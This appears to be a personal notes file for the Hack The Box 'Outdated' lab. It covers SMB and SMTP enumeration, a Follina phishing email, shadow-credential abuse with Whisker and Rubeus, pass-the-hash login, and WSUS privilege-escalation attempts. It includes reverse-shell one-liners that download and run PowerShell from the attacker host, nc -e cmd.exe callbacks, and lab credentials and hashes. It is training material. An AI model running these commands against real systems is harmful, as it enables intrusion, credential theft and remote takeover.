@@ -1,0 +1,720 @@
+==
+tags: #windows #medium #WSUS #follina
+=
+
+* nmap
+  #+begin_src bat
+  sudo nmap -sV -sC -oA nmap/outdated.basic 10.129.229.239
+
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: mail.outdated.htb, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: ..)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-10T19:36:06+00:00; +3h45m39s from scanner time.
+| ssl-cert: Subject: commonName=DC.outdated.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
+| Not valid before: 2026-07-10T18:44:15
+|_Not valid after:  2027-07-10T18:44:15
+445/tcp   open  microsoft-ds?          
+464/tcp   open  kpasswd5?                                 
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-10T19:36:06+00:00; +3h45m39s from scanner time.
+| ssl-cert: Subject: commonName=DC.outdated.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
+| Not valid before: 2026-07-10T18:44:15
+|_Not valid after:  2027-07-10T18:44:15
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-10T19:36:06+00:00; +3h45m39s from scanner time.
+| ssl-cert: Subject: commonName=DC.outdated.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
+| Not valid before: 2026-07-10T18:44:15
+|_Not valid after:  2027-07-10T18:44:15
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: outdated.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2026-07-10T19:36:06+00:00; +3h45m39s from scanner time.
+| ssl-cert: Subject: commonName=DC.outdated.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.outdated.htb
+| Not valid before: 2026-07-10T18:44:15
+|_Not valid after:  2027-07-10T18:44:15
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+50003/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Hosts: mail.outdated.htb, DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+  #+end_src
+** full scan
+   #+begin_src bat
+   sudo nmap -p- -A -T4 -oA nmap/outdated.full 10.129.229.239
+
+8530/tcp  open  http          Microsoft IIS httpd 10.0                                                               
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn't have a title. 
+   #+end_src
+   turns out this is some windows update service; this can also be seen in the
+   smb output.
+   #+begin_src bat
+   Port 8530 is used by Windows Server Update Services (WSUS) for HTTP
+   communication. It allows client systems to connect to the WSUS server to
+   receive updates.
+   #+end_src
+* smb null session
+  #+begin_src 
+  $ nxc smb 10.129.229.239 -u 'guest' -p '' --shares
+
+SMB [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB [+] outdated.htb\guest: 
+SMB [*] Enumerated shares
+SMB Share           Permissions     Remark
+SMB -----           -----------     ------
+SMB ADMIN$                          Remote Admin
+SMB C$                              Default share
+SMB IPC$            READ            Remote IPC
+SMB NETLOGON                        Logon server share 
+SMB Shares          READ            
+SMB SYSVOL                          Logon server share 
+SMB UpdateServicesPackages                 A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+SMB WsusContent                     A network share to be used by Local Publishing to place published content on this WSUS system.
+SMB WSUSTemp                        A network share used by Local Publishing from a Remote WSUS Console Instance.
+  #+end_src
+** smbclient
+   #+begin_src bat
+   smbclient -U 'guest%' //10.129.229.239/Shares
+   #+end_src
+   inside this share, we find a pdf called =NOC_Reminder.pdf= which contains an
+   email address:
+   #+begin_src
+   Due to last week's security breach we need to rebuild some of our core servers. This has impacted a handful of our workstations, update
+services, monitoring tools and backups. As we work to rebuild, please assist our NOC by e-mailing a link to any internal web applications to
+itsupport@outdated.htb so we can get them added back into our monitoring platform for alerts and notifications.
+   #+end_src
+   the continuation states there's a new employee and lists a bunch of CVEs.
+** enumerate password policy
+   #+begin_src bat
+   $ nxc smb 10.129.229.239 -u 'Guest' -p '' --pass-pol
+
+SMB 10.129.229.239  445    DC [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:outdated.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB 10.129.229.239  445    DC [+] outdated.htb\Guest: 
+   #+end_src
+   gets nothing.
+* brute-force email password
+  #+begin_src bat
+  hydra -l itsupport@outdated.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.229.239
+
+[ERROR] all children were disabled due too many connection errors
+  #+end_src
+* manually connecting to smtp
+  telnet failed; use nc with the =C= option(fixes some clrf issue):
+  #+begin_src bat
+  $ nc -C -nv 10.129.229.239 25
+
+(UNKNOWN) [10.129.229.239] 25 (smtp) open
+220 mail.outdated.htb ESMTP
+EHLO testing.local
+250-mail.outdated.htb
+250-SIZE 20480000
+250-AUTH LOGIN
+250 HELP
+AUTH LOGIN
+334 VXNlcm5hbWU6
+  #+end_src
+  here's what's going on:
+  #+begin_src 
+  The server responds with a 334 status code followed by a Base64 encoded
+  string asking for the username (typically VXNlcm5hbWU6, which translates to
+  "Username:").
+  The client must provide the valid username encoded in Base64
+  #+end_src
+  since we don't have the creds, let's move on.
+* rid cycling
+  let's get all usernames:
+  #+begin_src bat
+  impacket-lookupsid anonymous@manager.htb -no-pass | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1
+
+Administrator
+Guest
+krbtgt
+btables
+sflowers
+  #+end_src
+* asreproast
+** nxc
+  #+begin_src bat
+  $ nxc ldap dc.outdated.htb -u usernames.txt -p '' --asreproast asreproast.out -k
+
+LDAP        dc.outdated.htb 389    DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:outdated.htb) (signing:Enforced) (channel binding:Never)
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+  #+end_src
+** impacket-GetNPUsers
+  #+begin_src bat
+  $ impacket-GetNPUsers outdated.htb/ -no-pass -usersfile usernames.txt
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
+[-] User btables doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User sflowers doesn't have UF_DONT_REQUIRE_PREAUTH set
+  #+end_src
+* smtp-user-enum
+  #+begin_src bat
+  $ smtp-user-enum -M RCPT -U usernames.txt -D outdated.htb -t 10.129.229.239
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... usernames.txt
+Target count ............. 1
+Username count ........... 5
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ outdated.htb
+
+######## Scan started at Sun Jul 12 15:45:28 2026 #########
+10.129.229.239: btables@outdated.htb exists
+######## Scan completed at Sun Jul 12 15:45:28 2026 #########
+1 results.
+
+5 queries in 1 seconds (5.0 queries / sec)
+  #+end_src
+* hydra
+  #+begin_src bat
+  hydra -l btables@outdated.htb -P /usr/share/wordlists/rockyou.txt -f 10.129.229.239 smtp
+  #+end_src
+  same error.
+* CVE-2022-30190-Follina-exploit
+  this is one of the exploits listed in the pdf. there's an [[https://github.com/DarkRelay-Security-Labs/CVE-2022-30190-Follina-exploit][exploit]] available
+  for this. the way to trigger this involves sending the attack-host url in
+  the email body to the email-id from the pdf.
+** send email with swaks
+   #+begin_src bat
+   $ swaks --server mail.outdated.htb --from test@example.com --to itsupport@outdated.htb --header "Subject: Monitoring request" --body "http://10.10.16.179"
+
+=== Trying mail.outdated.htb:25...
+=== Connected to mail.outdated.htb.
+<-  220 mail.outdated.htb ESMTP
+ -> EHLO kali
+<-  250-mail.outdated.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<test@example.com>
+<-  250 OK
+ -> RCPT TO:<itsupport@outdated.htb>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Mon, 13 Jul 2026 06:13:13 +0200
+ -> To: itsupport@outdated.htb
+ -> From: test@example.com
+ -> Subject: Monitoring request
+ -> Message-Id: <20260713061313.1691758@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> http://10.10.16.179
+ -> 
+ -> 
+ -> .
+<-  250 Queued (8.078 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+   #+end_src
+** listen with tcpdump
+   #+begin_src bat
+   $ sudo tcpdump -ni tun0 tcp port 80
+
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+06:13:48.316876 IP 10.129.31.232.49842 > 10.10.16.179.80: Flags [S], seq 3723451185, win 64240, options [mss 1346,nop,wscale 8,nop,nop,sackOK], length 0
+06:13:48.316940 IP 10.10.16.179.80 > 10.129.31.232.49842: Flags [R.], seq 0, ack 3723451186, win 0, length 0
+   #+end_src
+   so we can confirm we get a call back. now how does this become a shell?
+** attempts to get a shell                                           :ATTACH:
+   :PROPERTIES:
+   :ID:       b7f0d63b-c8cb-4ed8-a99a-2516a6bf24e0
+   :END:
+   did a lot of stuff but just could not figure out how everything was meant
+   to work together - how the follina exploit is supposed to work is:
+   [[attachment:2026-07-14_13-34.png]]
+   
+   so i was having a tough time figuring out what exactly to do with the =rtf/docx=
+   file that gets generated. once the tcpdump callback happened, i figured it
+   needn't involve this exploit at all and that we could just host a revshell
+   script and send the path via the email body. this didn't work because it turns
+   out the vuln here does depend on the payload in the =exploit.html= file generated
+   by the exploit script. so:
+   #+begin_src bat
+   $ python follina.py -m command -c  "IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.179:8000/rev.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.179 -Port 4444" -t rtf
+
+Generated 'clickme.rtf' in current directory
+Generated 'exploit.html' in 'www' directory
+Serving payload on http://localhost:80/exploit.html
+   #+end_src
+   this requires another couple of links to work:
+   #+begin_src bat
+   $ python -m http.server 8000
+   #+end_src
+   this serves the =rev.ps1= script adapted from nishang: 
+   #+begin_src bat
+   Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.179 -Port 4444
+   #+end_src
+   and an nc listener on 4444, where we eventually get the connection by
+   sending an email with =swaks=:
+   #+begin_src bat
+   $ swaks --server mail.outdated.htb --from test@example.com --to itsupport@outdated.htb --header "Subject: Monitoring request" --body "http://10.10.16.179/exploit.html"
+
+=== Trying mail.outdated.htb:25...
+=== Connected to mail.outdated.htb.
+<-  220 mail.outdated.htb ESMTP
+ -> EHLO kali
+<-  250-mail.outdated.htb
+<-  250-SIZE 20480000
+<-  250-AUTH LOGIN
+<-  250 HELP
+ -> MAIL FROM:<test@example.com>
+<-  250 OK
+ -> RCPT TO:<itsupport@outdated.htb>
+<-  250 OK
+ -> DATA
+<-  354 OK, send.
+ -> Date: Tue, 14 Jul 2026 05:42:32 +0200
+ -> To: itsupport@outdated.htb
+ -> From: test@example.com
+ -> Subject: Monitoring request
+ -> Message-Id: <20260714054232.2035740@kali>
+ -> X-Mailer: swaks v20240103.0 jetmore.org/john/code/swaks/
+ -> 
+ -> http://10.10.16.179/exploit.html
+ -> 
+ -> 
+ -> .
+<-  250 Queued (8.203 seconds)
+ -> QUIT
+<-  221 goodbye
+=== Connection closed with remote host.
+   #+end_src
+*** shell as btables
+   #+begin_src bat
+   $ rlwrap nc -lvnp 4444
+
+PS C:\Users\btables\AppData\Local\Temp\SDIAG_099cfedf-a145-4091-bbee> 
+
+btables
+   #+end_src
+* btables creds script
+  there's no flag yet. however, there's a script which provides creds for the user: 
+  #+begin_src bat
+  PS C:\Users\btables> type check_mail.ps1
+
+Import-Module Mailozaurr
+$user = 'btables@outdated.htb'
+$pass = 'GHKKb7GEHcccdCT8tQV2QwL3'
+$regex = [Regex]::new('(http(s)?(:\/\/))?((\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}|[\w.]\.htb)(\/[^\s,]+)?)')
+$already_seen = @()
+$client = connect-imap -server 'mail.outdated.htb' -password $pass -username $user -port 143 -options auto
+while ($true) {
+    $msgs = Get-IMAPFolder -client $client -verbose
+    foreach ($msg in $msgs.Messages) {
+        if (-not ($already_seen -contains $msg.MessageId)) {
+            $already_seen = $already_seen + $msg.MessageId
+            $match = $regex.Matches($msg.TextBody.TrimEnd())
+            iwr $match.Value
+        }
+    }
+    if ($already_seen.count -ge 60) {$already_seen = @()}
+    #Disconnect-IMAP -Client $client
+    sleep 15
+    if (get-process -name msdt) {stop-process -name msdt -force}
+    sleep 15
+}
+  #+end_src
+  we can try to modify this script to read the emails in the inbox; however,
+  there's nothing in any folders:
+  #+begin_src bat
+  PS C:\users\btables> $user = 'btables@outdated.htb'
+  PS C:\users\btables> $pass = 'GHKKb7GEHcccdCT8tQV2QwL3'
+
+  PS C:\users\btables> $client = connect-imap -server 'mail.outdated.htb' -password $pass -username $user -port 143 -options auto
+
+  PS C:\users\btables> $msgs = Get-IMAPFolder -client $client -verbose
+  PS C:\users\btables> $msgs.Messages.Count
+  0
+
+  PS C:\users\btables> $client.Data.PersonalNamespaces | ForEach-Object { $client.Data.GetFolders($_) } | Select Name,FullName,Count
+
+  Name    FullName Count
+  ----    -------- -----
+  INBOX   INBOX        0
+  Trash   Trash        0
+  Queue   Queue        0
+  Sent    Sent         0
+  Drafts  Drafts       0
+  btables btables      0
+  #+end_src
+  the problem with the cred is that it seems to not be 
+* smb
+  #+begin_src bat
+  nxc smb 10.129.229.239 -u btables -p 'GHKKb7GEHcccdCT8tQV2QwL3' --shares
+  #+end_src
+* enumerate shares from powershell
+  #+begin_src bat
+  PS C:\> Get-SmbShare
+
+Name   ScopeName Path       Description  
+----   --------- ----       -----------  
+ADMIN$ *         C:\Windows Remote Admin 
+C$     *         C:\        Default share
+IPC$   *                    Remote IPC 
+  #+end_src
+  this user has no access
+* lazagne
+  running =.\lazagne all= gives no output, so enable verbose with =-vv=, (just =-v=
+  returns the version number); it finds nothing.
+* powerview
+  we know =btables= is the only member of the =ITStaff= group; so let's see what
+  the group can do.
+  #+begin_src bat
+  PS C:\users\btables> Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -match "ITStaff"}
+
+ObjectDN                : CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+AceQualifier            : AccessAllowed
+ActiveDirectoryRights   : ReadProperty, WriteProperty
+ObjectAceType           : ms-DS-Key-Credential-Link
+AceFlags                : None
+AceType                 : AccessAllowedObject
+InheritanceFlags        : None
+SecurityIdentifier      : S-1-5-21-4089647348-67660539-4016542185-1107
+IdentityReferenceName   : ITStaff
+IdentityReferenceDomain : outdated.htb
+IdentityReferenceDN     : CN=ITStaff,CN=Users,DC=outdated,DC=htb
+IdentityReferenceClass  : group
+  #+end_src
+* shadow credentials
+  we have the permission to add shadow creds to the =sflowers= user. we can't
+  use =bloodyAD= or similar since we don't have the creds for the =btables= user,
+  so use =Whisker.exe= designed for the same purpose. downloaded the
+  pre-compiled binary and stored it in =/opt/Whisker=;
+  transfer it to the target and run it like so:
+  #+begin_src bat
+  PS C:\users\btables> .\Whisker.exe add /target:sflowers
+
+[*] No path was provided. The certificate will be printed as a Base64 blob
+[*] No pass was provided. The certificate will be stored with the password xxljhiukGNpbskmy
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 4c5721f2-6a7c-4910-9166-a862a6e3c23f
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] You can now run Rubeus with the following syntax:
+
+Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAzCCCXQGCSqGSIb3DQEHAaCCCWUEgglhMIIJXTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF... /password:"xxljhiukGNpbskmy" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+  #+end_src
+  this runs into an issue copying multiple lines so instead, save it into a
+  pfx file.
+  #+begin_src bat
+  PS C:\users\btables> .\Whisker.exe add /target:sflowers /path:C:\Users\btables\sflowers.pfx /password:Password123!
+
+[*] Searching for the target account
+[*] Target user found: CN=Susan Flowers,CN=Users,DC=outdated,DC=htb
+[*] Generating certificate
+[*] Certificate generaged
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID 03fb3400-e5de-4769-96df-9c388e8eadd0
+[*] Updating the msDS-KeyCredentialLink attribute of the target object
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[*] Saving the associated certificate to file...
+[*] The associated certificate was saved to C:\Users\btables\sflowers.pfx
+[*] You can now run Rubeus with the following syntax:
+Rubeus.exe asktgt /user:sflowers /certificate:C:\Users\btables\sflowers.pfx /password:"Password123!" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+  #+end_src
+** rubeus
+   used the precompiled binary from [[https://github.com/jakobfriedl/precompiled-binaries/tree/main][the repo]] 
+   #+begin_src bat
+   PS C:\users\btables> .\Rubeus.exe asktgt /user:sflowers /certificate:C:\Users\btables\sflowers.pfx /password:"Password123!" /domain:outdated.htb /dc:DC.outdated.htb /getcredentials /show
+
+[*] Action: Ask TGT
+[*] Using PKINIT with etype rc4_hmac and subject: CN=sflowers
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'outdated.htb\sflowers'
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+      doIF0jCCBc6gAwIBBaEDAgEWooIE5
+
+  ServiceName              :  krbtgt/outdated.htb
+  ServiceRealm             :  OUTDATED.HTB
+  UserName                 :  sflowers (NT_PRINCIPAL)
+  UserRealm                :  OUTDATED.HTB
+  StartTime                :  7/15/2026 4:48:39 PM
+  EndTime                  :  7/16/2026 2:48:39 AM
+  RenewTill                :  7/22/2026 4:48:39 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  M3951Eq6b9jKjW8m8D++KA==
+  ASREP (key)              :  D98F0EDFA969A061701282DCE25FEF05
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : 1FCDB1F6015DCB318CC77BB2BDA14DB5
+   #+end_src
+* user flag
+  #+begin_src 
+  $ evil-winrm -i 10.129.229.239 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5
+
+,*Evil-WinRM* PS C:\Users\sflowers\Desktop> dir
+
+
+    Directory: C:\Users\sflowers\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----         8/3/2022   4:19 PM         514472 PsExec64.exe
+-ar---        7/14/2026  10:20 AM             34 user.txt
+
+
+,*Evil-WinRM* PS C:\Users\sflowers\Desktop> type user.txt
+64f9bf10453816bbc167f0aad76b8b6a
+  #+end_src
+  interestingly, there's a =psexec= binary present on the machine - probably an
+  artifact from some other user?
+* privesc
+** winpeas                                                           :ATTACH:
+   :PROPERTIES:
+   :ID:       a60f07f1-67ac-4514-a9e8-c5885b1b17ca
+   :END:
+   reveals there's a binary we have full access over:
+   #+begin_src bat
+   File Permissions "C:\WSUS\WsusContent\wuagent.exe": WSUS Administrators [Allow: AllAccess]
+   
+   File Permissions "C:\WSUS\wuagent.exe": sflowers [Allow: AllAccess]      
+   #+end_src
+   the first binary is meant for Admins whereas the second one is meant for
+   the user.
+   running the binaries reveal they're both just instances of =psexec= (!) which
+   leads me to think this lab might involve hopping to another host?
+   [[attachment:2026-07-16_08-33.png]]
+   [[attachment:2026-07-16_08-36.png]]
+*** transfer the text file over smb
+    #+begin_src bat
+    $ impacket-smbserver share . -smb2support 
+    #+end_src
+    copy from target:
+    #+begin_src bat
+    ,*Evil-WinRM* PS C:\Users\sflowers\Desktop>  copy winpeas.txt \\10.10.16.179\share\winpeas.txt
+    #+end_src
+    this has windows line endings; so convert *in place* with:
+    #+begin_src bat
+    dos2unix -f winpeas.txt
+    #+end_src
+** ipconfig
+   #+begin_src bat
+   ,*Evil-WinRM* PS C:\Users\sflowers\Desktop> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 3:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv4 Address. . . . . . . . . . . : 10.129.229.239
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : 10.129.0.1
+
+Ethernet adapter vEthernet (vSwitch):
+
+   Connection-specific DNS Suffix  . :
+   IPv4 Address. . . . . . . . . . . : 172.16.20.1
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 0.0.0.0
+   #+end_src
+   this is likely to be just virtualbox
+** wsus part from winpeas
+    #+begin_src 
+    WSUS is using http: http://wsus.outdated.htb:8530
+    You can test https://github.com/pimps/wsuxploit to escalate privileges
+    And UseWUServer is equals to 1, so it is vulnerable!
+    CVE-2025-59287: Clients talk to WSUS at http://wsus.outdated.htb:8530 (UseWUServer=1). Unpatched WSUS allows unauthenticated deserialization to SYSTEM.
+
+  [X] Exception: Access denied
+    WSUS Server version: 10.0.17763.1 (verify patch level for CVE-2025-59287).
+    CVE-2025-59287: Local WSUS server exposes an unauthenticated deserialization surface reachable over HTTP(S). Patch or restrict access.
+    #+end_src
+** the wsus exploit repo
+   [[https://github.com/pimps/wsuxploit][the repo]] from the winpeas output sets up a fake server from where a binary
+   can be uploaded and we could get a shell back as SYSTEM. however, we need
+   to be able to trigger wsus update manually. however, we might not need this
+   since we have write access to the share where these updates are picked up
+   from
+** shares
+   #+begin_src bat
+   $ nxc smb 10.129.229.239 -u sflowers -H 1FCDB1F6015DCB318CC77BB2BDA14DB5 --shares
+
+Share           Permissions     Remark
+-----           -----------     ------
+ADMIN$                          Remote Admin
+C$                              Default share
+IPC$            READ            Remote IPC
+NETLOGON        READ            Logon server share 
+Shares          READ            
+SYSVOL          READ            Logon server share 
+
+UpdateServicesPackages READ,WRITE      A network share to be used by client systems for collecting all software packages (usually applications) published on this WSUS system.
+
+WsusContent     READ,WRITE      A network share to be used by Local Publishing to place published content on this WSUS system.
+
+WSUSTemp        READ,WRITE      A network share used by Local Publishing from a Remote WSUS Console Instance.
+   #+end_src
+   so it looks like the path is somethingl like - use the fact that wsus is
+   exploitable combined with the fact that the shared folders connected to
+   wsus are writable.
+** use smbclient with hash
+   #+begin_src bat
+   smbclient --pw-nt-hash -U 'sflowers%1FCDB1F6015DCB318CC77BB2BDA14DB5' //10.129.229.239/WSUSTemp
+   #+end_src
+   this is empty and we're able to write files.
+** SharpWSUS exploit repo
+   [[https://github.com/nettitude/SharpWSUS][this repo]] provides a way to use the exploit from within the target system;
+   a precompiled binary has been downloaded;
+   NOTE: look at the [[*SharpWSUS.ex][OFFICIAL GUIDE section]] for a possibly better version of
+   the binary
+   #+begin_src bat
+   .\sharpwsus.exe create /payload:"C:\Users\sflowers\Desktop\psexec64.exe" /args:"-accepteula -s -d cmd.exe /c PsExec.exe \\localhost -accepteula -s cmd.exe /c "type c:\Users\Administrator\Desktop\root.txt" > C:\Windows\Temp\root.txt" /title:"Great UpdateC21" /date:2021-10-03 /kb:500123 /rating:Important /description:"Really important update" /url:"https://google.com"
+
+sharpwsus approve /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"
+
+sharpwsus check /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local
+
+sharpwsus delete /updateid:9e21a26a-1cbe-4145-934e-d8395acba567 /computername:win10-client10.blorebank.local /groupname:"Awesome Group C2"
+   #+end_src
+
+   #+begin_src bat
+   PS C:\Users\sflowers\desktop> .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\psexec64.exe" /args:"-accepteula -s -d powershell.exe -NoP -W Hidden -Exec Bypass -C `"IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.179/rev.ps1')`""
+
+[*] Action: Create Update
+[*] Creating patch to use the following:
+[*] Payload: psexec64.exe
+[*] Payload Path: C:\Users\sflowers\Desktop\psexec64.exe
+[*] Arguments: -accepteula -s -d powershell.exe -NoP -W Hidden -Exec Bypass -C IEX
+[*] Arguments (HTML Encoded): -accepteula -s -d powershell.exe -NoP -W Hidden -Exec Bypass -C IEX
+################# WSUS Server Enumeration via SQL ##################
+ServerName, WSUSPortNumber, WSUSContentLocation
+-----------------------------------------------
+DC, 8530, c:\WSUS\WsusContent
+ImportUpdate
+Update Revision ID: 30
+PrepareXMLtoClient
+InjectURL2Download
+DeploymentRevision
+PrepareBundle
+PrepareBundle Revision ID: 31
+PrepareXMLBundletoClient
+DeploymentRevision
+[*] Update created - When ready to deploy use the following command:
+[*] SharpWSUS.exe approve /updateid:e6fa3b30-2666-47fc-aa98-b431497380d7 /computername:Target.FQDN /groupname:"Group Name"
+[*] To check on the update status use the following command:
+[*] SharpWSUS.exe check /updateid:e6fa3b30-2666-47fc-aa98-b431497380d7 /computername:Target.FQDN
+[*] To delete the update use the following command:
+[*] SharpWSUS.exe delete /updateid:e6fa3b30-2666-47fc-aa98-b431497380d7 /computername:Target.FQDN /groupname:"Group Name"
+[*] Create complete
+   #+end_src
+*** approve
+    #+begin_src bat
+    PS C:\Users\sflowers\desktop> .\sharpWSUS.exe approve /updateid:e6fa3b30-2666-47fc-aa98-b431497380d7 /computername:dc.outdated.htb /groupname:"Users"
+
+[*] Action: Approve Update
+Targeting dc.outdated.htb
+TargetComputer, ComputerID, TargetID
+------------------------------------
+dc.outdated.htb, bd6d57d0-5e6f-4e74-a789-35c8955299e1, 1
+Group Exists = False
+Group Created: Users
+Added Computer To Group
+Approved Update
+[*] Approve complete
+    #+end_src
+*** simpler payload
+    instead of trying to get a shell, we can see if we can create a file:
+    #+begin_src bat
+    .\SharpWSUS.exe create /payload:"C:\Users\sflowers\Desktop\psexec64.exe" /args:"-accepteula -s cmd.exe /c whoami > C:\Windows\Temp\whoami.txt"
+    #+end_src
+    doesn't work either
+* OFFICIAL SOLUTION
+** SharpWSUS.ex
+   uses the [[https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries][powersharp binaries repo]]; which contains powershell invocations of
+   many base-64 encoded binaries. copy the base64 string from the
+   [[https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-SharpWSUS.ps1][Invoke-SharpWSUS]] file there and decode it:
+   #+begin_src bat
+   cat b64_sharpwsus | base64 -d > SharpWSUS.gz
+   gzip -d SharpWSUS.gz
+   #+end_src
+   this results in a =SharpWSUS.exe= binary which is then copied over.
+** new shell
+   transfers the =nc.exe= binary and uses it to establish another reverse shell
+   on 4444 from within the =evil-winrm= session because it's more stable:
+   #+begin_src bat
+  ,*Evil-WinRM* PS C:\Users\sflowers\Desktop> start-process .\nc64.exe -args "-e cmd.exe 10.10.16.179 4444"
+   #+end_src
+   then sets up another listener on 9001 on the attack host to try and catch
+   the SYSTEM rev shell:
+** create fake update
+    #+begin_src bat
+    .\SharpWSUS.exe create /payload:"C:\users\sflowers\Desktop\PsExec64.exe" /args:"accepteula -s -d c:\\users\\sflowers\\desktop\\nc64.exe -e cmd.exe 10.10.16.179 9001" /title:"pwned"
+    #+end_src
+    even after all this, it doesn't work.
+* ippsec
+** cme username weirdness
+   checking anonymous access with an empty username is different from tyring a
+   non-existent username is different from trying 'Guest' which is a valid
+   username
+   *so it's imperative to test with non-existing usernames even on smbclient*
+** swaks
+   given the facts that the document mentions an email address and the body is
+   meant to contain a link to a web application, sets up an nc listener on 80
+   and uses swaks to create an email which should ideally ping our ip:
+   #+begin_src bat
+   swaks --to itsupport@outdated.htb --from root@ippsec.rocks --server mail.outdated.htb --body "http://10.10.16.179/" --header "Subject: Internal Web App Request"
+   #+end_src
+   from the nc output, we can see the =User Agent= is powershell
+** contpy as the shell
+   uses this as it's got auto-complete capabielites. [[https://github.com/antonioCoco/ConPtyShell][contpy repo]];
+   needs some terminal resizing, so start a new pane exclusively for this:
+   #+begin_src bat
+   stty raw -echo; (stty size; cat) | nc -lvnp 3001
+   #+end_src
+   copy over the [[https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1][ps1 file]] and add this at the end:
+   #+begin_src bat
+   Invoke-ConPtyShell 10.10.16.179 9001
+   #+end_src
+** hyper-v
+   notes the strange internal ip and explains that this is a nested VM for
+   some reason
+** attempt to crack btables hash with responder
+   it's not possible in this case, but it would generally be a good idea to
+   attempt to get the hash and try and crack it.
+** SharpHound
+   since we don't have the creds and can't run bloodhound, use sharphound
